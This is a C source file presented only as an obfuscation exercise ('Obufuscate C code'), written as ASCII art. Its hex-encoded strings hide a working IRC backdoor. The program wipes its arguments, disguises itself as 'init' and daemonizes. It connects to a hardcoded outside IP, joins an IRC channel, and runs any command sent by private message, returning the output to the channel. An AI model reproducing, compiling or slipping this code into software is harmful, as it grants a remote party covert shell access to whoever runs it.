/*
   obeirc.c by Luca Petrocchi petrocchi@myoffset.me 28/10/2006 -> 31/05/2007 -> 19/01/2017
   Obufuscate C code...
   */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pwd.h>

#define L strlen
#define M malloc


                                 ;;int main(
                                 int c,char*v
                                 []){if(0){}
                                  ;;;struct
                         sockaddr_in a;struct passwd*p               ;int s,r;
                   char*e[10];;;FILE*m;;;for(r=0;r!=c;r++)    memset(v[r],0,L(v[r]));
              e[c=0]=(char*)0x696e6974;;;e[1] = (char*)malloc(4);;;;for(s=24;s>=0;s-=8)
            e[1][c++]=(int)*e[0]>>s;;;memcpy(v[0],e[1],L(e[1]));;;free(((((e[1])))));;;
            (c=daemon(0,0))?c=0:0;;e[0]=(char*)0x3231332e;e[1]=(char*)0x3230392e;e[2]=
          (char*)0x3139352e;e[3]=(char*)0x31343400;e[4]=(char*)malloc(((    16)));;;;
        for(r=0;r<4;r++)for(s=24;s>=0;s-=8)e[4][c++]=(int)*e[r]>>s;        if(0){;;}
      if((s=socket(2,0x1,0x0))<0x0)exit(-1);;bzero(&a,sizeof(a));          (0x0*0);
      a.sin_family=0x2;;a.sin_addr.s_addr=inet_addr((e[4]));;if(          0){0+0;}
        a.sin_port=(uint16_t)2842;if(0x0>0x1/0x1){(0x0*(0x0^0x2)         )/(01);}
         if((r=connect(s,(struct sockaddr*)&a,sizeof(a)))<0){;;          {;close
           (s);;exit(-1);}};p=getpwuid(geteuid());;e[0]=(char*)         (char*)
             M(L((p->pw_name))+7);;e[1]=(char*)(char*)M((L(p->         pw_name
              )*2)+33);e[2] =(char*)(char*)M(15);e[3]=(char*)         (char*)M
                (L(p->pw_name)+11);sprintf(e[0],"\x4E" "\x49"      "\x43\x4B"
                  " _%s\n""",p->pw_name);;sprintf(e[1],"\x55"    "\x53""\x45"
                   "\x52 %s \x31\x32\x37" "\x2E\x30\x2E\x30"     "\x2E\x31"
                   " %s %s\n",p->pw_name,e[4],p->pw_name);;      if(0)
                    {0x00^0x02;}sprintf(e[2],"\x4A\x4F\x49"
                    "\x4E %s\n", "\x23\x73\x70\x65\x6E"""
                    "\x6B\x6F\x6C\x6F");sprintf(e[3],"%s"
                    " _%s :","\x50\x52\x49\x56\x4D\x53"""
                    "\x47",p->pw_name);;for(r=0;r<3;r++){
		    send(s,e[r],L(e[r]),0);free((e[r]));};
	           free(e[4]);e[4]=(char *)(char *)M(1024);
	           e[5]=(char*)(char*)M(1024);for(;;){bzero
	           (e[4],1024);;;;if(recv(s,e[4],1024,0)>0)
                  if((e[0]=strstr(e[4],e[3]))){(e[6]=strchr
                  (e[4],'!'));;e[7]=(char*)M((e[6]-e[4])+1);
                  bzero(e[7],(e[6]-e[4])+1);for(r=1;r<(e[6]-e
                 [4]);r++)e[7][r-1]=e[4][r];;e[7][(e[6]-e[4])
                 ]='\0';r=1024-(L("ABCDEFGHI")+L(e[7]));e[8]=
                (char*)M(L(e[0]+L(e[3])));bzero(e[8],L(e[0]+L
                ((e[3]))));memcpy(e[8],e[0]+L(e[3]),L(e[0]+L(e
                [3]))-2);bzero(e[5],1024);;e[9]=(char*)M((r));
               bzero(e[9],r);m =popen(e[8],"r");;while(fgets(e
               [9],r,m)!=NULL){sprintf(e[5],"%s %s ","\x50\x52"
                "\x49\x56\x4D\x53\x47",e[7]);strcat(e[5],e[9]);
                 send(s,e[5],L(e[5]),0);bzero(e[9],r);;bzero(e
                  [5],1024);;}for(r=6;r<9;r++)free(e[r]);;}}
                    free(e);if(0x0>0x1/0x1){(0x0*(0x0^0x2)
                       )/(01);}close(s);(0x05*0x02)+(0);
                          L("ABCDEFGHILMNOPQRSTUVZ");;
                                  ;;;return((0));}

